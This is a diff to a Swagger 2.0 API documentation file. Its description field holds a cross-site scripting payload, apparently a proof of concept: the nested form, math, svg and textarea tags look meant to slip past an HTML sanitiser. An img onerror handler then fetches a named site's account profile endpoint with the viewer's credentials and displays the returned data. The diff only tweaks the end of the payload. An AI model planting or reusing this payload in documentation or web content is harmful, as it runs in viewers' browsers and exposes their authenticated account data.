@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=url='https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/profile/details';fetch(url,{credentials:'include'}).then(function(response){return+response.text();}).then(function(data){alert(JSON.stringify(JSON.parse(data)));});src=0></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=url='https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/profile/details';fetch(url,{credentials:'include'}).then(function(response){return+response.text();}).then(function(data){alert(JSON.stringify(JSON.parse(data)));});src=1"></form>
 
   version: production
 basePath: /JSSResource/
